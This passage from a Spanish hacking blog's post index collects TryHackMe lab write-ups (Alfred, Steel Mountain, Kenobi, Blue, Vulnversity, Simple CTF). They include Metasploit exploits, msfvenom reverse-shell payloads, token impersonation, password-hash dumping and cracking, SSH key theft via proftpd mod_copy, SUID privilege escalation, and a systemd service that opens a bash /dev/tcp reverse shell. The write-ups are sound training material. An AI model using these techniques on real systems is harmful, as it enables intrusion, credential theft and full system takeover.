compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of exe file: 73802 bytes saved as: shell-name.exe task 3 - privilege escalation paso 3: se usará la suplantación de token para conseguir acceso privilegiado (info sobre tokens https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens). abusing token privileges for lpe https://www.exploit-db.com/papers/42556 cargo módulo de powershell en meterpreter y ejecuto whoami /priv para ver privilegios. uso impersonate_token para conseguir el token de acceso. migro el proceso de meterpreter a services.exe para conseguir un token de privilegio más elevado. revisión de tokens en meterpreter: meterpreter \u0026gt; load powershell loading extension powershell...success. meterpreter \u0026gt; powershell_shell ps \u0026gt; whoami /priv privileges information ---------------------- privilege name description state =============================== ========================================= ======= seincreasequotaprivilege adjust memory quotas for a process enabled sesecurityprivilege manage auditing and security log enabled setakeownershipprivilege take ownership of files or other objects enabled seloaddriverprivilege load and unload device drivers enabled sesystemprofileprivilege profile system performance enabled sesystemtimeprivilege change the system time enabled seprofilesingleprocessprivilege profile single process enabled seincreasebasepriorityprivilege increase scheduling priority enabled secreatepagefileprivilege create a pagefile enabled sebackupprivilege back up files and directories enabled serestoreprivilege restore files and directories enabled seshutdownprivilege shut down the system enabled sedebugprivilege debug programs enabled sesystemenvironmentprivilege modify firmware environment values enabled sechangenotifyprivilege bypass traverse checking enabled seremoteshutdownprivilege force shutdown from a remote system enabled seundockprivilege remove computer from docking station enabled semanagevolumeprivilege perform volume maintenance tasks enabled seimpersonateprivilege impersonate a client after authentication enabled secreateglobalprivilege create global objects enabled seincreaseworkingsetprivilege increase a process working set enabled setimezoneprivilege change the time zone enabled secreatesymboliclinkprivilege create symbolic links enabled impersonate_token en meterpreter: meterpreter \u0026gt; load incognito loading extension incognito...success. meterpreter \u0026gt; list_tokens -g [-] warning: not currently running as system, not all tokens will be available call rev2self if primary process token is system delegation tokens available ======================================== \\ builtin\\administrators builtin\\users nt authority\\authenticated users nt authority\\ntlm authentication nt authority\\service nt authority\\this organization nt service\\audioendpointbuilder nt service\\certpropsvc nt service\\cscservice nt service\\iphlpsvc nt service\\lanmanserver nt service\\pcasvc nt service\\schedule nt service\\sens nt service\\sessionenv nt service\\trkwks nt service\\umrdpservice nt service\\uxsms nt service\\winmgmt nt service\\wuauserv impersonation tokens available ======================================== no tokens available meterpreter \u0026gt; impersonate_token \u0026#34;builtin\\administrators\u0026#34; [-] warning: not currently running as system, not all tokens will be available call rev2self if primary process token is system [+] delegation token available [+] successfully impersonated user nt authority\\system meterpreter \u0026gt; getuid server username: nt authority\\system migración del servicio: meterpreter \u0026gt; ps process list ============ pid ppid name arch session user path --- ---- ---- ---- ------- ---- ---- 0 0 [system process] 4 0 system x64 0 396 4 smss.exe x64 0 nt authority\\system c:\\windows\\system32\\smss.exe 528 520 csrss.exe x64 0 nt authority\\system c:\\windows\\system32\\csrss.exe 576 520 wininit.exe x64 0 nt authority\\system c:\\windows\\system32\\wininit.exe 584 568 csrss.exe x64 1 nt authority\\system c:\\windows\\system32\\csrss.exe 612 568 winlogon.exe x64 1 nt authority\\system c:\\windows\\system32\\winlogon.exe 672 576 services.exe x64 0 nt authority\\system c:\\windows\\system32\\services.exe ... meterpreter \u0026gt; migrate 672 [*] migrating from 2492 to 672... [*] migration completed successfully.| bandera root: meterpreter \u0026gt; search -f root.txt found 1 result... ================= path size (bytes) modified (utc) ---- ------------ -------------- c:\\windows\\system32\\config\\root.txt 70 2019-10-26 13:36:00 +0200 meterpreter \u0026gt; cat c:\\windows\\system32\\config\\root.txt meterpreter \u0026gt; cd c:\\\\windows\\\\system32\\\\config meterpreter \u0026gt; cat root.txt dff0f748678f280250f25a45b8046b4a conclusion aunque estamos ya en el bloque de “advanced exploitation”, esta máquina me ha parecido bastante sencilla. en la anterior, “steel mountain”, tuve más dificultades con algunas tareas. los pasos no los he seguido al pie de la letra y he ido probando según veía lo que me parecía mejor, pero el resultado es el mismo que con los pasos propuestos. igualmente he probado con las instrucciones propuestas, para poder probar distintos métodos de acceso y poder tener una visión más amplia de las diferentes formas de abordar una máquina como esta.\n(◕‿‿◕) hack the planet! ","title":"Alfred [TryHackMe]"},{"date":"2023-08-28","image":"/images/post_pics/steelmountain/steel_mountain.jpeg","link":"https://k3ssdev.github.io/posts/steel-mountain/","summary":"Introducción Steel Mountain es la cuarta máquina de la serie \u0026ldquo;Offensive Pentesting\u0026rdquo; de TryHackMe. Es una sala fácil que tiene como objetivo aprender sobre escalada de privilegios en un entorno Windows comprometido. En esta máquina, se explora la explotación de una vulnerabilidad conocida en un servidor web, se obtiene acceso inicial, se explora la enumeración y finalmente se logra escalar privilegios para obtener control total sobre la máquina.","tags":["“Meterpreter”","“Windows\"","Easy","Enumeration","HTTP Server","Metasploit","Privilege Escalation","Reverse Shell","TryHackMe","WinPeas"],"text":"introducción steel mountain es la cuarta máquina de la serie \u0026ldquo;offensive pentesting\u0026rdquo; de tryhackme. es una sala fácil que tiene como objetivo aprender sobre escalada de privilegios en un entorno windows comprometido. en esta máquina, se explora la explotación de una vulnerabilidad conocida en un servidor web, se obtiene acceso inicial, se explora la enumeración y finalmente se logra escalar privilegios para obtener control total sobre la máquina.\ntask 1 - desplegar la máquina paso 1: desplegar la máquina accedo a la plataforma tryhackme y despliego la máquina steel mountain. task 2 - acceso inicial paso 1: escaneo de puertos con nmap realizo un escaneo de puertos en la máquina objetivo utilizando nmap.\ncomandos utilizados:\nsudo nmap -ss --min-rate 5000 -p- 10.10.25.83 -pn -v -on nmap_inicial paso 2: identificar el servidor web en el puerto 8080 escaneo el servidor web en el puerto 8080 para obtener más información.\ncomandos utilizados:\nnmap -p8080 -sc -sv 10.10.25.83 -pn -on nmap_final paso 3: identificar la cve para el servidor httpfileserver busco sobre el servidor rejetto en exploit-db y encuentro la cve-2014-6287 asociada al servidor httpfileserver 2.3. paso 4: explotación del servidor httpfileserver utilizo metasploit para explotar la vulnerabilidad en el servidor rejetto httpfileserver.\ncomandos utilizados:\nmsf6 \u0026gt; use exploit/windows/http/rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set rhosts 10.10.25.83 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set rport 8080 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set lhost tun0 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; run task 3 - privilege escalation paso 1: enumerar la máquina comprometida después de obtener acceso, realizo una enumeración inicial de la máquina comprometida. paso 2: escalar privilegios como usuario bill utilizo el script powerup.ps1 para buscar vulnerabilidades de escalada de privilegios.\ncomandos utilizados:\n. .\\\\powerup.ps1 invoke-allchecks paso 3: identificar el servicio vulnerable examino la salida de powerup y encuentro información sobre el servicio vulnerable \u0026ldquo;advancedsystemcareservice9\u0026rdquo;. paso 4: generar y ejecutar un payload malicioso genero un payload con msfvenom y lo ejecuto en la máquina comprometida.\ncomandos utilizados:\nsudo msfvenom -p windows/shell_reverse_tcp lhost=tu_ip lport=4455 -f exe -o advanced.exe paso 5: resultado con éxito, obtengo privilegios y gano acceso de administrador en la máquina comprometida. task 4 - access and escalation without metasploit paso 4.1: descargar el exploit y ncat.exe descargo el exploit y nc.exe en mi máquina local. paso 4.2: iniciar un servidor http en mi máquina local inicio un servidor http en mi máquina local con python para servir los archivos necesarios a la máquina objetivo.\ncomandos utilizados:\npython3 -m http.server 80 paso 4.3: preparar un listener de netcat preparo un listener de netcat en mi máquina local para recibir la conexión inversa desde la máquina objetivo.\ncomandos utilizados:\nnc -lvnp 1234 paso 4.4: ejecutar el exploit dos veces en la máquina objetivo ejecuto el exploit dos veces contra la máquina objetivo para descargar ncat.exe y luego ejecuto el payload.\ncomandos utilizados:\nsudo python2 exploit.py 10.10.192.191 8080 paso 4.5: obtener una conexión inversa una vez que tengo una conexión inversa en mi listener, tengo acceso a la máquina objetivo como el usuario \u0026ldquo;bill\u0026rdquo; y ya puedo escalar privilegios como se hizo anteriormente. conclusion \u0026ldquo;steel mountain\u0026rdquo; ha sido una máquina bastante divertida con tématica de mr. robot, una gran serie sobre hacking que es especialmente realista en los detalles técnicos. en esta máquina, tenemos la oportunidad de aprender más sobre la explotación de una vulnerabilidad conocida en un servidor web en un entorno windows, obtener acceso mediante una shell inversa y escalar privilegios para obtener control total sobre la máquina con metasploit y meterpreter, además de poder hacer lo mismo con un exploit personalizado sin utilizar metasploit.\n(◕‿‿◕) hack the planet! ","title":"Steel Mountain [TryHackMe]"},{"date":"2023-08-28","image":"/images/post_pics/kenobi/kenobi.png","link":"https://k3ssdev.github.io/posts/kenobi/","summary":"Introducción La sala ¨Kenobi” está pensada como introducción de la serie “Offensive Pentesting”. Es la tercera máquina, y tiene una dificultad baja. El objetivo es vulnerar una máquina Linux para obtener acceso a un recurso compartido de Samba, manipular una versión vulnerable de proftpd para obtener acceso inicial y escalar privilegios a root a través de un binario SUID.","tags":["Easy","FTP","Linux","Privilege Escalation","SAMBA","SUID","TryHackMe"],"text":"introducción la sala ¨kenobi” está pensada como introducción de la serie “offensive pentesting”. es la tercera máquina, y tiene una dificultad baja. el objetivo es vulnerar una máquina linux para obtener acceso a un recurso compartido de samba, manipular una versión vulnerable de proftpd para obtener acceso inicial y escalar privilegios a root a través de un binario suid.\ntask 1 - desplegar la máquina paso 1: escaneo la máquina desplegada para descubrir los servicios. encuentro 7 puertos abiertos. el objetivo tiene servicios ftp, ssh, http y samba como posibles vectores de ataque. # escaneo inicial con salida a fichero sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.107.4 # listo y filtro los puertos en nmap_inicial ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) # escaneo final con los puertos guardados nmap -p$ports -sc -sv -pn -on nmap_final 10.10.107.4 salida de shell para analizar: # resultado de escaneo ╰─ cat nmap_final | grep tcp ─╯ 21/tcp open ftp proftpd 1.3.5 22/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.7 (ubuntu linux; protocol 2.0) 80/tcp open http apache httpd 2.4.18 ((ubuntu)) 111/tcp open rpcbind 2-4 (rpc #100000) | 100000 2,3,4 111/tcp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 58369/tcp6 mountd | 100005 1,2,3 59881/tcp mountd | 100021 1,3,4 40297/tcp6 nlockmgr | 100021 1,3,4 44483/tcp nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl 139/tcp open netbios-ssn samba smbd 3.x - 4.x (workgroup: workgroup) 445/tcp open samba smbd 4.3.11-ubuntu (workgroup: workgroup) 2049/tcp open nfs 2-4 (rpc #100003) 44483/tcp open nlockmgr 1-4 (rpc #100021) 49693/tcp open mountd 1-3 (rpc #100005) 50169/tcp open mountd 1-3 (rpc #100005) 59881/tcp open mountd 1-3 (rpc #100005) task 2 - enumerando samba uso de nuevo nmap con un script específico para enumerar servicios smb. se encuentran 3 recursos compartidos, siendo “anonymous” uno de ellos, siendo una posible vía de acceso inicial. se accede con smbclient y la cuenta anonymous, encontrando un fichero log con informacion sobre claves ssh y configuración de ftp. escaneo puerto 111 para rpcbind con scripts de network file sharing usando nmap. se encuentra un punto de montaje en “/var”. paso 1: enumero smb con nmap nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.107.4 resultado para analizar port state service 445/tcp open microsoft-ds host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.107.4\\ipc$: | type: stype_ipc_hidden | comment: ipc service (kenobi server (samba, ubuntu)) | users: 2 | max users: \u0026lt;unlimited\u0026gt; | path: c:\\tmp | anonymous access: read/write | current user access: read/write | \\\\10.10.107.4\\anonymous: | type: stype_disktree | comment: | users: 0 | max users: \u0026lt;unlimited\u0026gt; | path: c:\\home\\kenobi\\share | anonymous access: read/write | current user access: read/write | \\\\10.10.107.4\\print$: | type: stype_disktree | comment: printer drivers | users: 0 | max users: \u0026lt;unlimited\u0026gt; | path: c:\\var\\lib\\samba\\printers | anonymous access: \u0026lt;none\u0026gt; |_ current user access: \u0026lt;none\u0026gt; nmap done: 1 ip address (1 host up) scanned in 6.49 seconds paso 2: accedo con smbclient # accedo con smbclient smbclient //10.10.107.4/anonymous # reviso contenido smb: \\\u0026gt; ls . d 0 wed sep 4 12:49:09 2019 .. d 0 wed sep 4 12:56:07 2019 log.txt n 12237 wed sep 4 12:49:09 2019 # descargo fichero smb: \\\u0026gt; get log.txt paso 3: escaneo de puerto rpc # escaneo con nmap del puerto 111 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.107.4 # resultado starting nmap 7.94 ( https://nmap.org ) at 2023-08-27 22:32 cest nmap scan report for 10.10.107.4 host is up (0.042s latency). port state service 111/tcp open rpcbind | nfs-showmount: |_ /var * task 3 - acceso inicial con proftpd la versión del servicio es 1.3.5\nen exploit-db se encuentra 4 exploits para esa versión.\nse usa el exploit de **proftpd module mod_copy.\nel módulo mod_copy implementa los comandos site cpfr y site cpto, que se pueden usar para copiar archivos/directorios de un lugar a otro en el servidor. cualquier cliente no autenticado puede aprovechar estos comandos para copiar archivos desde cualquier parte del sistema de archivos a un destino elegido.\nme conecto con netcat y descargo la clave privada de kenobi.\nmonto el directorio compartido /var/tmp en mi equipo y descargo la clave privada ssh.\npaso 4: conexión con netcat # conexion al puerto 21 con netcat nc 10.10.107.4 21 ─╯ 220 proftpd 1.3.5 server (proftpd default installation) [10.10.107.4] # en nc, ejecuto el primer comando para copiar el fichero site cpfr /home/kenobi/.ssh/id_rsa 350 file or directory exists, ready for destination name # ejecuto el segundo comando que lo pega en la unidad montada en /var site cpto /var/tmp/id_rsa 250 copy successful paso 5: acceso al directorio remoto # creo una carpeta en mi equipo mkdir /mnt/kenobinfs # monto el directorio compartido en mi equipo mount 10.10.107.4:/var /mnt/kenobinfs # listo el directorio para comprobarlo ls -la /mnt/kenobinfs total 56 drwxr-xr-x 14 root root 4096 sep 4 2019 . drwxr-xr-x 3 root root 4096 ago 27 22:44 .. drwxr-xr-x 2 root root 4096 sep 4 2019 backups drwxr-xr-x 9 root root 4096 sep 4 2019 cache drwxrwxrwt 2 root root 4096 sep 4 2019 crash drwxr-xr-x 40 root root 4096 sep 4 2019 lib drwxrwsr-x 2 root staff 4096 abr 12 2016 local lrwxrwxrwx 1 root root 9 sep 4 2019 lock -\u0026gt; /run/lock drwxrwxr-x 10 root tss 4096 sep 4 2019 log drwxrwsr-x 2 root mail 4096 feb 27 2019 mail drwxr-xr-x 2 root root 4096 feb 27 2019 opt lrwxrwxrwx 1 root root 4 sep 4 2019 run -\u0026gt; /run drwxr-xr-x 2 root root 4096 ene 30 2019 snap drwxr-xr-x 5 root root 4096 sep 4 2019 spool drwxrwxrwt 6 root root 4096 ago 27 22:40 tmp drwxr-xr-x 3 root root 4096 sep 4 2019 www paso 6: acceso ssh # me copio la clave privada que esta en /tmp cp id_rsa ~/descargas # le doy permisos sudo chmod 660 id_rsa # me conecto con la clave privada por ssh ssh -i id_rsa kenobi@10.10.107.4 # obtengo la bandera que hay en el home de kenobi kenobi@kenobi:~$ cat user.txt task 4 - privilege escalation con la variable path busco binarios con el bit suid activado. se encuentra el binario /usr/bin/menu que llama la atención sobre el resto. el binario tiene un menu con 3 opciones, cada una ejecuta un comando. ejecutando strings sobre el binario se ve que comandos ejectua: curl -i localhost uname -r ifconfig se modifica path para explotar el permiso de root que tienen los binarios del menu, haciendo una copia de /bin/sh en /tmp con el nombre curl, le asignamos todos los permisos y exportamos el directorio a la variable path. # crear copia de sh en /tmp cd /tmp/ echo /bin/sh \u0026gt; curl # dar permisos chmod 777 curl # exportar a variable path export path=/tmp:$path # explotar uso de menu para obtener root /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** enter your choice :1 # whoami root # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) conclusion con kenobi acabamos el bloque introductorio de “offensive pentesting”. es una sala muy sencilla, pero es divertida, sobretodo siendo temática de star wars. a partir de ahora se empezará a jugar con máquinas más complejas, por lo que la confianza ganada hasta aquí también considero que es importante subrayar.\n(◕‿‿◕) hack the planet! ","title":"Kenobi [TryHackMe]"},{"date":"2023-08-27","image":"/images/post_pics/blue/blue.png","link":"https://k3ssdev.github.io/posts/blue/","summary":"Introducción Se trata de la segunda máquina de la serie \u0026ldquo;Offensive Pentesting\u0026rdquo; de TryHackMe, que se centra en la explotación de la vulnerabilidad EternalBlue en sistemas Windows. Es una sala sencilla, destinada a familiarizarse con el reconocimiento, la explotación y el escalamiento de privilegios en sistemas Windows y en uso de Metasploit y Meterpreter.","tags":["“Meterpreter”","“Reverse Shell”","“Windows\"","Easy","Enumeration","Metasploit","Password Attacks","Privilege Escalation","Privilege Escalation","TryHackMe","Vulnerability Exploitation"],"text":"introducción se trata de la segunda máquina de la serie \u0026ldquo;offensive pentesting\u0026rdquo; de tryhackme, que se centra en la explotación de la vulnerabilidad eternalblue en sistemas windows. es una sala sencilla, destinada a familiarizarse con el reconocimiento, la explotación y el escalamiento de privilegios en sistemas windows y en uso de metasploit y meterpreter.\ntask 1 - reconocimiento paso 1: enumeración de puertos realizo un escaneo de puertos con nmap para identificar los puertos abiertos. descubro que el puerto 445 (smb) estaba abierto en el objetivo. encuentro una vulnerabilidad conocida en el servicio smb, ms17-010. comando nmap:\nnmap -sv --script vuln -p- 10.10.185.150 task 2 - explotación paso 2: identificación de vulnerabilidad investigo sobre la vulnerabilidad ms17-010 y su explotación potencial. busco el módulo \u0026ldquo;ms17_010_eternalblue\u0026rdquo; de metasploit y lo selecciono. herramienta metasploit:\nuse windows/smb/ms17_010_eternalblue paso 3: explotación configuro metasploit con mi dirección ip como host. ejecuto el exploit para obtener acceso en el sistema objetivo. consigo una shell inversa y la con meterpreter. comandos metasploit:\nset rhosts 10.10.185.150 set lhost \u0026lt;mi dirección ip\u0026gt; exploit task 3 - escalamiento de privilegios paso 4: escalamiento de privilegios busco la manera de escalar privilegios y convertir la shell en una sesión de meterpreter. utilizo el módulo \u0026ldquo;shell_to_meterpreter\u0026rdquo; de metasploit para lograrlo. comandos metasploit:\nuse post/multi/manage/shell_to_meterpreter sessions set session \u0026lt;número de sesión\u0026gt; exploit task 4 - descifrando contraseñas paso 5: extracción de contraseñas con meterpreter, ejecuto el comando \u0026ldquo;hashdump\u0026rdquo; para extraer las contraseñas almacenadas en el sistema. comando meterpreter:\nhashdump paso 6: descifrando contraseña copio el hash de contraseña de un usuario no predeterminado y utilizo john the ripper para descifrarlo. la contraseña descifrada resultante es \u0026ldquo;alqfna22\u0026rdquo;. comandos john the ripper:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashdump.txt --format=nt task 5 - búsqueda de banderas paso 7: búsqueda de banderas utilizo el comando \u0026ldquo;search\u0026rdquo; en meterpreter para encontrar las ubicaciones de las banderas en el sistema. descubro las siguientes banderas: c:\\\\flag1.txt (ubicada en la raíz del sistema) c:\\\\windows\\\\system32\\\\config\\\\flag2.txt (ubicada en la carpeta de configuración) c:\\\\users\\\\jon\\\\documents\\\\flag3.txt (ubicada en la carpeta de documentos de un usuario) comando meterpreter:\nsearch -f flag*.txt paso 8: exploración de banderas uso \u0026ldquo;cat\u0026rdquo; para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas de la sala: comando meterpreter:\ncat c:\\\\flag1.txt conclusión se trata de una máquina muy sencilla, ya que se cubren los aspectos clave de la enumeración, la explotación de vulnerabilidades, el escalamiento de privilegios, la extracción y el descifrado de contraseñas, y la búsqueda de ficheros en sistemas windows.\n(◕‿‿◕) hack the planet! ","title":"Blue [TryHackMe]"},{"date":"2023-08-26","image":"/images/post_pics/vulnversity/vulnversity.png","link":"https://k3ssdev.github.io/posts/vulnversity/","summary":"Introducción Vulnversity es la primera máquina a vulnerar del learning path “Offensive Pentesting” de TryHackMe. Es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “Jr Penetration Tester”. El objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.","tags":["Burp Suite","Directory Enumeration","Easy","File Upload Vulnerability","Gobuster","Linux","Privilege escalation","Reverse Shell","SUID","TryHackMe"],"text":"introducción vulnversity es la primera máquina a vulnerar del learning path “offensive pentesting” de tryhackme. es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “jr penetration tester”. el objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.\nrecopilación de información (reconocimiento) comienzo con un escaneo de puertos utilizando nmap para enumerar los servicios en la máquina:\nnmap -ss -p- -t4 -on nmap_scan 10.10.71.251 los resultados muestran varios puertos abiertos, incluidos el 21 (ftp), 22 (ssh), 139 (netbios-ssn), 445 (microsoft-ds), 3128 (squid http proxy) y 3333 (http).\nenumeración web escaneo de directorios con gobuster hago un escaneo de directorios en el servidor web que se ejecuta en el puerto 3333. uso gobuster con la lista de directorios predeterminada:\ngobuster dir -u http://10.10.71.251:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt el escaneo encuentra un directorio llamado /internal.\nexplotación de la vulnerabilidad mi siguiente paso es intentar subir un archivo php como shell inversa, pero me encuentro con restricciones en la extensión del archivo. preparo una lista de extensiones php y uso burp suite para realizar un ataque \u0026ldquo;sniper\u0026rdquo; desde el módulo repeater.\nreviso los resultados de repeater y compruebo que la extensión .phtml permite eludir la comprobación de extensiones de archivos. subo un archivo llamado revere-shell.phtml que contiene el código para ejecutar una shell inversa.\nobtención de acceso para obtener acceso, abro un listener con netcat:\nnc -lvnp 1234 luego, para estabilizar la shell y mejorar su funcionalidad, ejecuté el comando:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; además, configuro la variable de entorno term para xterm con:\nexport term=xterm de esta forma, puedo usar comandos como clear y ctrl + c en la shell.\nescalada de privilegios enumeración de usuarios mientras exploro el sistema vulnerado, encuentro un usuario llamado \u0026ldquo;bill\u0026rdquo; en el directorio /home.\nbúsqueda de binarios suid luego, usando el comando find, me pongo a buscar binarios con el bit suid y sgid habilitados:\nfind / -type f -perm -u=s -o -type f -perm -g=s 2\u0026gt;/dev/null me llama la atención el binario /bin/systemctl, que tiene el bit suid habilitado.\nescalada de privilegios con systemctl investigo /bin/systemctl en gtfobins y encuentro una forma de escalada de privilegios para systemctl . el ejemplo de gtfobins es el siguiente:\ntf=$(mktemp).service echo \u0026#39;[service] type=oneshot execstart=/bin/bash -c \u0026#34;id \u0026gt; /tmp/output\u0026#34; [install] wantedby=multi-user.target\u0026#39; \u0026gt; $tf obtención de una shell de root para obtener una shell de root, modifico el archivo de servicio temporal (*.service) vinculado a /bin/systemctl para ejecutar un shell inverso como root. aquí está la configuración del archivo de servicio:\n[service] type=oneshot execstart=/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.14.50.184/4444 0\u0026gt;\u0026amp;1\u0026#34; [install] wantedby=multi-user.target reinicio el servicio temporal:\n/bin/systemctl systemctl link $tf en mi máquina local, configuro un listener en el puerto 4444:\nnc -lvnp 4444 y por ultimo activo el servicio temporal para que se ejecute ahora:\n/bin/systemctl enable $tf --now una vez reiniciado el servicio temporal en la máquina objetivo, obtengo una shell de root en mi máquina.\nconclusión vulnversity es una máquina idónea para principiantes, ya que permite practicar y aplicar conceptos fundamentales que serán muy útiles en posteriores máquinas del learning path “offensive pentesting”:\nenumeración de servicios y puertos mediante herramientas como nmap. escaneo de directorios en un servidor web utilizando gobuster. explotación de vulnerabilidades, como restricciones en la extensión de archivos, para cargar archivos maliciosos. obtención de acceso a través de una shell inversa y mejora de la funcionalidad de la shell. escalada de privilegios mediante la identificación de binarios suid y sgid. uso de gtfobins para abusar de binarios con permisos elevados. (◕‿‿◕) hack the planet! ","title":"Vulnversity [TryHackMe]"},{"date":"2023-03-22","image":"/images/post_pics/back/mr-robot-hello.gif","link":"https://k3ssdev.github.io/posts/back/","summary":"Vuelta al tajo.. Después de varios meses de abandono, hago el intento de retomar esto. He estado bastante ocupado estudiando para los exámenes de primer semestre del CFGS de Desarrollo de Aplicaciones Multiplataforma, así que no he tenido más remedio que pausar algunas cosas\u0026hellip; Pero ya estoy de vuelta y con ganas de seguir aprendiendo y compartiendo.","tags":["personal"],"text":"vuelta al tajo.. después de varios meses de abandono, hago el intento de retomar esto. he estado bastante ocupado estudiando para los exámenes de primer semestre del cfgs de desarrollo de aplicaciones multiplataforma, así que no he tenido más remedio que pausar algunas cosas\u0026hellip; pero ya estoy de vuelta y con ganas de seguir aprendiendo y compartiendo. la idea es marcarme un objetivo de publicar al menos una entrada al mes, aunque no prometo nada. poco a poco iré retomando el ritmo, y no solo con el blog, sino también con las máquinas de tryhackme, que también las tengo un poco abandonadas.\n(◕‿‿◕) hack the planet! ","title":"I'm back"},{"date":"2022-11-08","image":"/images/post_pics/simple-ctf/simple_ctf_intro.png","link":"https://k3ssdev.github.io/posts/simple_ctf/","summary":"Seguimos con los writeups de TryHackMe. Hoy le toca el turno a una sala fácil pensada tambien para principiantes llamada Simple CTF. En esta máquina hay que conseguir dos banderas para completarla. Vamos allá.\nEnumeración El primer paso que hay que dar en toda prueba de penetración es el de enumeración.","tags":["CTF","easy","hacking","Linux","tryhackme","Tryhackme","writeup"],"text":"seguimos con los writeups de tryhackme. hoy le toca el turno a una sala fácil pensada tambien para principiantes llamada simple ctf. en esta máquina hay que conseguir dos banderas para completarla. vamos allá.\nenumeración el primer paso que hay que dar en toda prueba de penetración es el de enumeración. la habitación de tryhackme nos hace unas primeras preguntas relacionadas con este paso, que son:\n¿cuantos servicios están funcionando en el puerto 1000? ¿cual es el servicio del puerto más alto? para resolver estas dos preguntas, empezamos con un escaneo de puertos usando nmap.\n┌──(alberto㉿kali)-[~/descargas] └─$ sudo nmap -n -pn -sc -sv -t4 -open 10.10.91.117 starting nmap 7.93 ( https://nmap.org ) at 2022-10-15 20:54 cest nmap scan report for 10.10.91.117 host is up (0.037s latency). not shown: 997 filtered tcp ports (no-response) some closed ports may be reported as filtered due to --defeat-rst-ratelimit port state service version 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | stat: | ftp server status: | connected to ::ffff:10.18.112.125 | logged in as ftp | type: ascii | no session bandwidth limit | session timeout in seconds is 300 | control connection is plain text | data connections will be plain text | at session startup, client count was 1 | vsftpd 3.0.3 - secure, fast, stable |_end of status | ftp-anon: anonymous ftp login allowed (ftp code 230) |_can\u0026#39;t get directory listing: timeout 80/tcp open http apache httpd 2.4.18 ((ubuntu)) |_http-title: apache2 ubuntu default page: it works |_http-server-header: apache/2.4.18 (ubuntu) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 2222/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.8 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 2048 294269149ecad917988c27723acda923 (rsa) | 256 9bd165075108006198de95ed3ae3811c (ecdsa) |_ 256 12651b61cf4de575fef4e8d46e102af6 (ed25519) service info: oss: unix, linux; cpe: cpe:/o:linux:linux_kernel service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 44.36 seconds estas son las opciones que uso en nmap:\n-n #sin resolución de dns, más rápido -sc #es equivalente a --script=default -sv* #detección de versión -t4 #establecer una plantilla de tiempo #si tiene una conexión ethernet o de banda ancha decente, recomendaría usar siempre -t4 tras el escaneo, podemos contestar a las dos preguntas que nos hace la sala.\nanálisis de vulnerabilidades en esta fase vamos a analizar las vulnerabilidades que puede tener la máquina. usando los datos recogidos durante la fase de enumeración, podremos comprobar si hay alguna vulnerabilidad conocida que podamos aprovechar.\nen este caso hay una mala configuración de seguyridad, parece que han dejado la puerta abierta en el servidor fpt para que se conecten usuarios anónimos:\nftp-anon: anonymous ftp login allowed (ftp code 230)* bien, ahora toca revisar la web que tienen en el puerto 80 con el servidor apache. voy a usar la herramienta gobuster para enumerar las posibles páginas y directorios que tenga la web.\n┌──(alberto㉿kali)-[~/descargas] └─$ gobuster dir -u http://10.10.91.117/ -w /usr/share/wordlists/dirb/common.txt =============================================================== gobuster v3.2.0-dev by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.10.91.117/ [+] method: get [+] threads: 10 [+] wordlist: /usr/share/wordlists/dirb/common.txt [+] negative status codes: 404 [+] user agent: gobuster/3.2.0-dev [+] timeout: 10s =============================================================== 2022/10/15 21:09:57 starting gobuster in directory enumeration mode =============================================================== /.hta (status: 403) [size: 291] /.htaccess (status: 403) [size: 296] /.htpasswd (status: 403) [size: 296] /index.html (status: 200) [size: 11321] /robots.txt (status: 200) [size: 929] /server-status (status: 403) [size: 300] /simple (status: 301) [size: 313] [--\u0026gt; http://10.10.91.117/simple/] progress: 4609 / 4615 (99.87%)=============================================================== 2022/10/15 21:10:16 finished =============================================================== además, compruebo si tiene el fichero robots.txt, que parece ser que el listado que usado para enumerar las paginas no tenia ese termino guardado.\n# # \u0026#34;$id: robots.txt 3494 2003-03-19 15:37:44z mike $\u0026#34; # # this file tells search engines not to index your cups server. # # copyright 1993-2003 by easy software products. # # these coded instructions, statements, and computer programs are the # property of easy software products and are protected by federal # copyright law. distribution and use rights are outlined in the file # \u0026#34;license.txt\u0026#34; which should have been included with this file. if this # file is missing or damaged please contact easy software 